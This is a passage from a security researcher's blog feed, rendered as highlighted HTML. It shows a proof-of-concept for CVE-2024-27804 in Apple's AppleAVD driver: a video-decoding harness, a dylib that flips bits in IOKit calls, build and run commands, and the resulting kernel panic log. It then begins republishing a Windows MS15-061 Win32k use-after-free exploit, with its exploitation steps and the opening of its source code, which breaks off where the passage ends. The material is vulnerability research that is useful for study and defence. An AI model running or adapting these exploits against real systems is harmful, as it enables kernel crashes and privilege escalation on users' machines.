+<span class="o">[</span>   17.083638] R10: ffffffff87024147 R11: 0000000000000001 R12: ffffffff84c13220
+<span class="o">[</span>   17.084325] R13: 00007f3d8ec37fff R14: ffff8881005e4da0 R15: ffff888114003980
+<span class="o">[</span>   17.085059] FS:  00007f3d8fc39640<span class="o">(</span>0000<span class="o">)</span> GS:ffff8881f6f00000<span class="o">(</span>0000<span class="o">)</span> knlGS:0000000000000000
+<span class="o">[</span>   17.085838] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+<span class="o">[</span>   17.086447] CR2: 00007f3d80000020 CR3: 0000000112f4c000 CR4: 0000000000350ef0</code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[from commit message there is a use-after-free on dentry’s d_fsdata fid list when a thread looks up a fid through dentry while another thread unlinks it:]]></summary></entry><entry><title type="html">CVE-2024-27804 Vulnerability in AppleAVD</title><link href="http://localhost:4000/fuzzing/2024/05/14/anotherappleavd.html" rel="alternate" type="text/html" title="CVE-2024-27804 Vulnerability in AppleAVD" /><published>2024-05-14T02:01:01+02:00</published><updated>2024-05-14T02:01:01+02:00</updated><id>http://localhost:4000/fuzzing/2024/05/14/anotherappleavd</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/05/14/anotherappleavd.html"><![CDATA[<p><a href="https://github.com/R00tkitSMM/CVE-2024-27804">https://github.com/R00tkitSMM/CVE-2024-27804</a></p>
+
+<p>tested on M1</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">// vtdecode.m 
+<span class="c">#include &lt;dlfcn.h&gt;</span>
+<span class="c">#include &lt;stdio.h&gt;</span>
+<span class="c">#import &lt;AVFoundation/AVFoundation.h&gt;</span>
+
+typedef void <span class="o">(</span><span class="k">*</span>t_VTApplyRestrictions<span class="o">)(</span>int arg<span class="o">)</span><span class="p">;</span>
+t_VTApplyRestrictions VTApplyRestrictions<span class="p">;</span>
+
+int __attribute__<span class="o">((</span>noinline<span class="o">))</span> fuzz<span class="o">(</span>const char <span class="k">*</span>filename<span class="o">)</span> <span class="o">{</span>
+  @autoreleasepool <span class="o">{</span>
+    NSError <span class="k">*</span>error <span class="o">=</span> nil<span class="p">;</span>
+    NSURL <span class="k">*</span>fileURL <span class="o">=</span> <span class="o">[</span>NSURL
+        fileURLWithPath:[NSString stringWithCString:filename
+                                           encoding:NSASCIIStringEncoding]]<span class="p">;</span>
+    AVAsset <span class="k">*</span>asset <span class="o">=</span> <span class="o">[</span>AVAsset assetWithURL:fileURL]<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>asset <span class="o">==</span> nil<span class="o">)</span>
+      <span class="k">return </span>0<span class="p">;</span>
+
+    AVAssetReader <span class="k">*</span>reader <span class="o">=</span> <span class="o">[[</span>AVAssetReader alloc] initWithAsset:asset
+                                                           error:&amp;error]<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>reader <span class="o">==</span> nil<span class="o">)</span>
+      <span class="k">return </span>0<span class="p">;</span>
+
+    NSArray <span class="k">*</span>tracks <span class="o">=</span> <span class="o">[</span>asset tracksWithMediaType:AVMediaTypeVideo]<span class="p">;</span>
+    <span class="k">if</span> <span class="o">(</span>tracks <span class="o">==</span> nil <span class="o">||</span> <span class="o">([</span>tracks count] <span class="o">==</span> 0<span class="o">))</span>
+      <span class="k">return </span>0<span class="p">;</span>
+
+    AVAssetTrack <span class="k">*</span>track <span class="o">=</span> tracks[0]<span class="p">;</span>
+
+    NSDictionary <span class="k">*</span>outputSettings <span class="o">=</span> <span class="o">[</span>NSDictionary
+        dictionaryWithObject:[NSNumber numberWithInt:kCMPixelFormat_32BGRA]
+                      forKey:<span class="o">(</span><span class="nb">id</span><span class="o">)</span>kCVPixelBufferPixelFormatTypeKey]<span class="p">;</span>
+    AVAssetReaderTrackOutput <span class="k">*</span>output <span class="o">=</span> <span class="o">[</span>AVAssetReaderTrackOutput
+        assetReaderTrackOutputWithTrack:track
+                         outputSettings:outputSettings]<span class="p">;</span>
+
+    <span class="o">[</span>reader addOutput:output]<span class="p">;</span>
+    <span class="o">[</span>reader startReading]<span class="p">;</span>
+
+    <span class="k">for</span> <span class="o">(</span>int frame <span class="o">=</span> 0<span class="p">;</span> frame &lt; 2<span class="p">;</span> frame++<span class="o">)</span> <span class="o">{</span>
+      // <span class="nb">printf</span><span class="o">(</span><span class="s2">"Frame %d</span><span class="se">\n</span><span class="s2">"</span>, frame<span class="o">)</span><span class="p">;</span>
+
+      CMSampleBufferRef sampleBuffer <span class="o">=</span> <span class="o">[</span>output copyNextSampleBuffer]<span class="p">;</span>
+      <span class="k">if</span> <span class="o">(</span>sampleBuffer <span class="o">==</span> nil<span class="o">)</span>
+        <span class="nb">break</span><span class="p">;</span>
+
+      CMSampleBufferInvalidate<span class="o">(</span>sampleBuffer<span class="o">)</span><span class="p">;</span>
+      CFRelease<span class="o">(</span>sampleBuffer<span class="o">)</span><span class="p">;</span>
+      sampleBuffer <span class="o">=</span> NULL<span class="p">;</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+
+  <span class="k">return </span>1<span class="p">;</span>
+<span class="o">}</span>
+
+int main<span class="o">(</span>int argc, const char <span class="k">*</span>argv[]<span class="o">)</span> <span class="o">{</span>
+  <span class="k">if</span> <span class="o">(</span>argc &lt; 2<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Usage: %s &lt;filename&gt;</span><span class="se">\n</span><span class="s2">"</span>, argv[0]<span class="o">)</span><span class="p">;</span>
+    <span class="k">return </span>0<span class="p">;</span>
+  <span class="o">}</span>
+
+  // make decoding run <span class="k">in </span>the current process instead of VTDecoderXPCService
+  void <span class="k">*</span>toolbox <span class="o">=</span> dlopen<span class="o">(</span><span class="s2">"/System/Library/Frameworks/VideoToolbox.framework/"</span>
+                         <span class="s2">"Versions/A/VideoToolbox"</span>,
+                         RTLD_NOW<span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(!</span>toolbox<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Error loading library</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+    <span class="k">return </span>0<span class="p">;</span>
+  <span class="o">}</span>
+  VTApplyRestrictions <span class="o">=</span>
+      <span class="o">(</span>t_VTApplyRestrictions<span class="o">)</span>dlsym<span class="o">(</span>toolbox, <span class="s2">"VTApplyRestrictions"</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">if</span> <span class="o">(!</span>VTApplyRestrictions<span class="o">)</span> <span class="o">{</span>
+    <span class="nb">printf</span><span class="o">(</span><span class="s2">"Error finding VTApplyRestrictions symbol</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+    <span class="k">return </span>0<span class="p">;</span>
+  <span class="o">}</span>
+  VTApplyRestrictions<span class="o">(</span>1<span class="o">)</span><span class="p">;</span>
+
+  fuzz<span class="o">(</span>argv[1]<span class="o">)</span><span class="p">;</span>
+
+  <span class="k">return </span>0<span class="p">;</span>
+<span class="o">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="c1">// flip.c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;IOKit/IOKitLib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;execinfo.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;sys/sysctl.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">flip_bit</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">len</span><span class="p">)</span>
+    <span class="k">return</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span> <span class="o">%</span> <span class="n">len</span><span class="p">;</span>
+
+  <span class="p">((</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x41414141</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">kern_return_t</span> <span class="n">fake_IOConnectCallMethod</span><span class="p">(</span><span class="n">mach_port_t</span> <span class="n">connection</span><span class="p">,</span>
+                                       <span class="kt">uint32_t</span> <span class="n">selector</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">input</span><span class="p">,</span>
+                                       <span class="kt">uint32_t</span> <span class="n">inputCnt</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">inputStruct</span><span class="p">,</span>
+                                       <span class="kt">size_t</span> <span class="n">inputStructCnt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">output</span><span class="p">,</span>
+                                       <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">outputCnt</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">outputStruct</span><span class="p">,</span>
+                                       <span class="kt">size_t</span> <span class="o">*</span><span class="n">outputStructCntP</span><span class="p">)</span> <span class="p">{</span>
+
+  <span class="n">flip_bit</span><span class="p">(</span><span class="n">inputStruct</span><span class="p">,</span> <span class="n">inputStructCnt</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">IOConnectCallMethod</span><span class="p">(</span><span class="n">connection</span><span class="p">,</span> <span class="n">selector</span><span class="p">,</span> <span class="n">input</span><span class="p">,</span> <span class="n">inputCnt</span><span class="p">,</span> <span class="n">inputStruct</span><span class="p">,</span>
+                             <span class="n">inputStructCnt</span><span class="p">,</span> <span class="n">output</span><span class="p">,</span> <span class="n">outputCnt</span><span class="p">,</span> <span class="n">outputStruct</span><span class="p">,</span>
+                             <span class="n">outputStructCntP</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">interposer</span> <span class="p">{</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">replacement</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="o">*</span><span class="n">original</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">interpose_t</span><span class="p">;</span>
+
+<span class="n">__attribute__</span><span class="p">((</span><span class="n">used</span><span class="p">))</span> <span class="k">static</span> <span class="k">const</span> <span class="n">interpose_t</span> <span class="n">interposers</span><span class="p">[]</span>
+    <span class="n">__attribute__</span><span class="p">((</span><span class="n">section</span><span class="p">(</span><span class="s">"__DATA,__interpose"</span><span class="p">)))</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="p">{.</span><span class="n">replacement</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">fake_IOConnectCallMethod</span><span class="p">,</span>
+         <span class="p">.</span><span class="n">original</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">IOConnectCallMethod</span><span class="p">}};</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">clang <span class="nt">-arch</span> arm64 <span class="nt">-o</span> vtdecode vtdecode.m <span class="nt">-framework</span> VideoToolbox <span class="nt">-framework</span> Foundation <span class="nt">-framework</span> CoreMedia  <span class="nt">-framework</span> CoreVideo <span class="nt">-framework</span>  AVFoundation
+clang <span class="nt">-dynamiclib</span> <span class="nt">-o</span> flip.dylib flip.c <span class="nt">-framework</span> IOKit</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nv">DYLD_INSERT_LIBRARIES</span><span class="o">=</span>./flip.dylib ./vtdecode input_poc/orientation-normal-fragmented.mp4.mov</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">panic<span class="o">(</span>cpu 4 <span class="nb">caller </span>0xfffffe0026851cdc<span class="o">)</span>: Unaligned kernel data abort. at pc 0xfffffe0026aed514, lr 0xfffffe0026aed5d8 <span class="o">(</span>saved state: 0xfffffe3a396e3200<span class="o">)</span>
+	  x0:  0x000000000000000e x1:  0xfffffe1002bdc01b  x2:  0x0000000000000000  x3:  0xfffffe3a396e3444
+	  x4:  0xfffffe3a396e344c x5:  0x000000000002d1f4  x6:  0x0000000000000000  x7:  0xffffffffffffffff
+	  x8:  0x0000000000000004 x9:  0xfffffe1002bdc01f  x10: 0x0000000000000000  x11: 0x0000000000000002
+	  x12: 0x0000000000000004 x13: 0x0000000000000000  x14: 0x0000000000000000  x15: 0x0000000000000000
+	  x16: 0xfffffe0026aeda90 x17: 0xfffffe0026aed9fc  x18: 0x0000000000000000  x19: 0xfffffe1b40e90000
+	  x20: 0x0000000000000000 x21: 0x0000000000000000  x22: 0xfffffe1002bdc000  x23: 0x0000000000000001
+	  x24: 0x0000000000000000 x25: 0xfffffe1002bdc024  x26: 0x000000000000001b  x27: 0x00000000000008b0
+	  x28: 0x000000000000001b fp:  0xfffffe3a396e3610  lr:  0xfffffe0026aed5d8  sp:  0xfffffe3a396e3550
+	  pc:  0xfffffe0026aed514 cpsr: 0x60401208         esr: 0x96000021          far: 0xfffffe1002bdc01b
+
+Debugger message: panic
+Memory ID: 0x6
+OS release <span class="nb">type</span>: User
+OS version: 23C71
+Kernel version: Darwin Kernel Version 23.2.0: Wed Nov 15 21:53:34 PST 2023<span class="p">;</span> root:xnu-10002.61.3~2/RELEASE_ARM64_T8103
+Fileset Kernelcache UUID: 6DAC2CF8E68E8F436296A697E29AAD44
+Kernel UUID: E245D804-1FA3-31E2-90BC-B4DF75B2129E
+Boot session UUID: 52885412-0864-4DFF-8E9E-36C3C7BC8B88
+iBoot version: iBoot-10151.61.4
+secure boot?: YES
+roots installed: 0
+Paniclog version: 14
+KernelCache slide: 0x000000001dac4000
+KernelCache base:  0xfffffe0024ac8000
+Kernel slide:      0x000000001dacc000
+Kernel text base:  0xfffffe0024ad0000
+Kernel text <span class="nb">exec </span>slide: 0x000000001efd8000
+Kernel text <span class="nb">exec </span>base:  0xfffffe0025fdc000
+mach_absolute_time: 0x1c4f4c5a5
+Epoch Time:        sec       usec
+  Boot    : 0x65a56518 0x000b7c0f
+  Sleep   : 0x00000000 0x00000000
+  Wake    : 0x00000000 0x00000000
+  Calendar: 0x65a5664f 0x00072ae4
+
+Zone info:
+  Zone map: 0xfffffe100f2dc000 - 0xfffffe300f2dc000
+  <span class="nb">.</span> VM    : 0xfffffe100f2dc000 - 0xfffffe14dbfa8000
+  <span class="nb">.</span> RO    : 0xfffffe14dbfa8000 - 0xfffffe1675940000
+  <span class="nb">.</span> GEN0  : 0xfffffe1675940000 - 0xfffffe1b4260c000
+  <span class="nb">.</span> GEN1  : 0xfffffe1b4260c000 - 0xfffffe200f2d8000
+  <span class="nb">.</span> GEN2  : 0xfffffe200f2d8000 - 0xfffffe24dbfa4000
+  <span class="nb">.</span> GEN3  : 0xfffffe24dbfa4000 - 0xfffffe29a8c70000
+  <span class="nb">.</span> DATA  : 0xfffffe29a8c70000 - 0xfffffe300f2dc000
+  Metadata: 0xfffffe3a1c3ac000 - 0xfffffe3a243ac000
+  Bitmaps : 0xfffffe3a243ac000 - 0xfffffe3a27194000
+  Extra   : 0 - 0
+
+CORE 0 recently retired instr at 0xfffffe00261886e4
+CORE 1 recently retired instr at 0xfffffe00261886e4
+CORE 2 recently retired instr at 0xfffffe00261886e4
+CORE 3 recently retired instr at 0xfffffe00261886e4
+CORE 4 recently retired instr at 0xfffffe0026186ee8
+CORE 5 recently retired instr at 0xfffffe00261886e4
+CORE 6 recently retired instr at 0xfffffe00261886e4
+CORE 7 recently retired instr at 0xfffffe00261886e4
+TPIDRx_ELy <span class="o">=</span> <span class="o">{</span>1: 0xfffffe1b448bd030  0: 0x0000000000001004  0ro: 0x000000010061c320 <span class="o">}</span>
+CORE 0 PVH locks held: None
+CORE 1 PVH locks held: None
+CORE 2 PVH locks held: None
+CORE 3 PVH locks held: None
+CORE 4 PVH locks held: None
+CORE 5 PVH locks held: None
+CORE 6 PVH locks held: None
+CORE 7 PVH locks held: None
+CORE 0: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39a13ef0
+CORE 1: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a392b7ef0
+CORE 2: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a37df7ef0
+CORE 3: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a37c8fef0
+CORE 4 is the one that panicked. Check the full backtrace <span class="k">for </span>details.
+CORE 5: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39033ef0
+CORE 6: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a39893ef0
+CORE 7: <span class="nv">PC</span><span class="o">=</span>0xfffffe002606ff34, <span class="nv">LR</span><span class="o">=</span>0xfffffe002606ff30, <span class="nv">FP</span><span class="o">=</span>0xfffffe3a396a7ef0
+Compressor Info: 3% of compressed pages limit <span class="o">(</span>OK<span class="o">)</span> and 2% of segments limit <span class="o">(</span>OK<span class="o">)</span> with 0 swapfiles and OK swap space
+Panicked task 0xfffffe1b46695e18: 14298 pages, 13 threads: pid 2352: vtdecode
+Panicked thread: 0xfffffe1b448bd030, backtrace: 0xfffffe3a396e2930, tid: 184820
+		  lr: 0xfffffe0026035568  fp: 0xfffffe3a396e29c0
+		  lr: 0xfffffe002617fa24  fp: 0xfffffe3a396e2a30
+		  lr: 0xfffffe002617de84  fp: 0xfffffe3a396e2b20
+		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e2b30
+		  lr: 0xfffffe0026034e48  fp: 0xfffffe3a396e2ee0
+		  lr: 0xfffffe002684726c  fp: 0xfffffe3a396e2f00
+		  lr: 0xfffffe0026851cdc  fp: 0xfffffe3a396e3080
+		  lr: 0xfffffe002617f890  fp: 0xfffffe3a396e30f0
+		  lr: 0xfffffe002617e138  fp: 0xfffffe3a396e31e0
+		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e31f0
+		  lr: 0xfffffe0026aed5d8  fp: 0xfffffe3a396e3610
+		  lr: 0xfffffe0026ad6fe4  fp: 0xfffffe3a396e3720
+		  lr: 0xfffffe0026ad66b4  fp: 0xfffffe3a396e3790
+		  lr: 0xfffffe0026ad4e48  fp: 0xfffffe3a396e37d0
+		  lr: 0xfffffe00267a0168  fp: 0xfffffe3a396e3810
+		  lr: 0xfffffe00267a0484  fp: 0xfffffe3a396e39a0
+		  lr: 0xfffffe002614b294  fp: 0xfffffe3a396e3ac0
+		  lr: 0xfffffe002603bce8  fp: 0xfffffe3a396e3b60
+		  lr: 0xfffffe002600edd4  fp: 0xfffffe3a396e3bc0
+		  lr: 0xfffffe00260273f8  fp: 0xfffffe3a396e3c60
+		  lr: 0xfffffe0026027864  fp: 0xfffffe3a396e3d50
+		  lr: 0xfffffe0026173698  fp: 0xfffffe3a396e3e20
+		  lr: 0xfffffe002617e18c  fp: 0xfffffe3a396e3f10
+		  lr: 0xfffffe0025fe3b68  fp: 0xfffffe3a396e3f20
+      Kernel Extensions <span class="k">in </span>backtrace:
+         com.apple.driver.AppleAVD<span class="o">(</span>737.1<span class="o">)[</span>63D957B3-2E48-36EA-880C-6F0BE3DE16A6]@0xfffffe0026a37e00-&gt;0xfffffe0026b04b43
+            dependency: com.apple.driver.AppleARMPlatform<span class="o">(</span>1.0.2<span class="o">)[</span>9FC0A536-5BC6-33D5-911A-5A46BDDBBCEF]@0xfffffe00269dfe20-&gt;0xfffffe0026a3295b
+            dependency: com.apple.driver.FairPlayIOKit<span class="o">(</span>71.3.0<span class="o">)[</span>AD212727-D14F-3DA2-8974-6CEA43B45BC1]@0xfffffe0027e23b50-&gt;0xfffffe0027f19aef
+            dependency: com.apple.iokit.CoreAnalyticsFamily<span class="o">(</span>1<span class="o">)[</span>0896C7D3-89F2-3D56-A301-5CB0FE0BBEAC]@0xfffffe0027cb1f60-&gt;0xfffffe0027cb9d4b
+            dependency: com.apple.iokit.IOSurface<span class="o">(</span>352.0.3<span class="o">)[</span>0351AFC2-D85C-3BB5-B9C6-C8C0F6C7A01D]@0xfffffe00288a7dc0-&gt;0xfffffe00288d85ab</code></pre></figure>]]></content><author><name></name></author><category term="fuzzing" /><summary type="html"><![CDATA[https://github.com/R00tkitSMM/CVE-2024-27804]]></summary></entry><entry><title type="html">Exploiting MS15-061 with reverse engineering Win32k.sys</title><link href="http://localhost:4000/fuzzing/2024/04/01/explitingwind32k.html" rel="alternate" type="text/html" title="Exploiting MS15-061 with reverse engineering Win32k.sys" /><published>2024-04-01T02:27:59+02:00</published><updated>2024-04-01T02:27:59+02:00</updated><id>http://localhost:4000/fuzzing/2024/04/01/explitingwind32k</id><content type="html" xml:base="http://localhost:4000/fuzzing/2024/04/01/explitingwind32k.html"><![CDATA[<p>MS15-061 is a Use After Free vulnerability in Windows Kernel. A malicious application can exploit it be able to execute arbitrary code with kernel privileges.</p>
+
+<p>in 2015 I managed to exploit it by reverse engineering Win32k.sys and it ended up in <a href="https://en.wikipedia.org/wiki/Metasploit">Metasploit</a>, you can read the blog post about it in <a href="https://www.rapid7.com/blog/post/2015/10/01/flipping-bits/">rapid7</a>.</p>
+
+<p>I’m republishing the exploit here.</p>
+
+<p>the code is heavly documented.
+steps:</p>
+<ul>
+  <li>Implement a PEB callback function for hooking.</li>
+  <li>trigger a vulnerability by creating a specific window to execute the vulnerable function.</li>
+  <li>Within the PEB callback, substitute a fake object with NtUserDefSetText in the Desktop heap.</li>
+  <li>Create a fake object with buffer filled with 0x0c0c0c0c and a pointer to tagWND. for safe dereferences: I used this trick similar to using fake vTable in Browser exploitation:
+  allocate 0x0c0c0c0c address and fill tagWND with 0x0c0c0c0c
+  so every dereference  will have a valid address in 0x0c0c0c0c range, this method can’t work on <a href="https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention">SMAP</a></li>
+  <li>Repeat this process until bServerSideWindowProc is set.</li>
+</ul>
+
+<p>Referenaces</p>
+<ul>
+  <li><a href="https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/2015/08/2015-08-27_-_ncc_group_-_exploiting_ms15_061_uaf_-_release.pdf">nccgroup</a></li>
+  <li><a href="http://www.mista.nu/research/mandt-win32k-slides.pdf">mista</a></li>
+  <li><a href="https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/">mwrinfosecurity</a></li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_HANDLEENTRY</span>
+<span class="p">{</span>
+    <span class="n">PVOID</span> <span class="n">phead</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">pOwner</span><span class="p">;</span>
+    <span class="n">BYTE</span> <span class="n">bType</span><span class="p">;</span>
+    <span class="n">BYTE</span> <span class="n">bFlags</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wUniq</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">HANDLEENTRY</span><span class="p">,</span> <span class="o">*</span><span class="n">PHANDLEENTRY</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SERVERINFO</span>
+<span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">dwSRVIFlags</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">cHandleEntries</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wSRVIFlags</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wRIPPID</span><span class="p">;</span>
+    <span class="n">WORD</span> <span class="n">wRIPError</span><span class="p">;</span>
+
+<span class="p">}</span> <span class="n">SERVERINFO</span><span class="p">,</span> <span class="o">*</span><span class="n">PSERVERINFO</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_SHAREDINFO</span>
+<span class="p">{</span>
+    <span class="n">PSERVERINFO</span> <span class="n">psi</span><span class="p">;</span>
+    <span class="n">PHANDLEENTRY</span> <span class="n">aheList</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">HeEntrySize</span><span class="p">;</span> <span class="c1">// Win7 - not present in WinXP?</span>
+    <span class="n">ULONG_PTR</span> <span class="n">pDispInfo</span><span class="p">;</span>
+    <span class="n">ULONG_PTR</span> <span class="n">ulSharedDelta</span><span class="p">;</span>
+    <span class="n">ULONG_PTR</span> <span class="n">awmControl</span><span class="p">;</span>        <span class="c1">// Not in XP</span>
+    <span class="n">ULONG_PTR</span> <span class="n">DefWindowMsgs</span><span class="p">;</span>     <span class="c1">// Not in XP</span>
+    <span class="n">ULONG_PTR</span> <span class="n">DefWindowSpecMsgs</span><span class="p">;</span> <span class="c1">// Not in XP</span>
+<span class="p">}</span> <span class="n">SHAREDINFO</span><span class="p">,</span> <span class="o">*</span><span class="n">PSHAREDINFO</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">Get__Win32ClientInfo</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="cm">/*
+   +0x1d4 GdiTebBatch      : _GDI_TEB_BATCH
+   +0x6b4 RealClientId     : _CLIENT_ID
+   +0x6bc GdiCachedProcessHandle : Ptr32 Void
+   +0x6c0 GdiClientPID     : Uint4B
+   +0x6c4 GdiClientTID     : Uint4B
+   +0x6c8 GdiThreadLocalInfo : Ptr32 Void
+   +0x6cc Win32ClientInfo  : [62] Uint4B
+   */</span>
+    <span class="kt">void</span> <span class="o">*</span><span class="n">address</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="kr">__asm</span>
+    <span class="p">{</span>
+	<span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="n">fs</span><span class="o">:</span><span class="p">[</span><span class="mx">00000018h</span><span class="p">]</span> <span class="c1">// eax=TEB</span>
+        <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">eax</span><span class="o">+</span><span class="mh">0x6cc</span><span class="p">]</span> <span class="c1">// Win32ClientInfo</span>
+	<span class="n">mov</span>	  <span class="n">address</span><span class="p">,</span><span class="n">eax</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">address</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">CHAR</span> <span class="n">originalCLS</span><span class="p">[</span><span class="mh">0x5c</span> <span class="o">+</span> <span class="mi">2</span><span class="p">];</span>
+
+<span class="n">HWND</span> <span class="n">GetKernelHandle</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">HWND</span> <span class="n">kernelWindowHandle</span><span class="p">;</span>
+    <span class="n">ULONG</span> <span class="n">i</span><span class="p">;</span>
+    <span class="n">HMODULE</span> <span class="n">hUser32</span><span class="p">;</span>
+    <span class="n">PSHAREDINFO</span> <span class="n">pSharedInfo</span><span class="p">;</span>
+    <span class="n">PSERVERINFO</span> <span class="n">pServerInfo</span><span class="p">;</span>
+    <span class="n">HANDLEENTRY</span> <span class="o">*</span><span class="n">UserHandleTable</span><span class="p">;</span>
+
+    <span class="n">pSharedInfo</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSHAREDINFO</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibraryA</span><span class="p">(</span><span class="s">"user32.dll"</span><span class="p">),</span> <span class="s">"gSharedInfo"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pSharedInfo</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Unable to locate SharedInfo"</span><span class="p">);</span>
+        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[*] SharedInfo @ %#p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pSharedInfo</span><span class="p">);</span>
+    <span class="p">}</span>
+
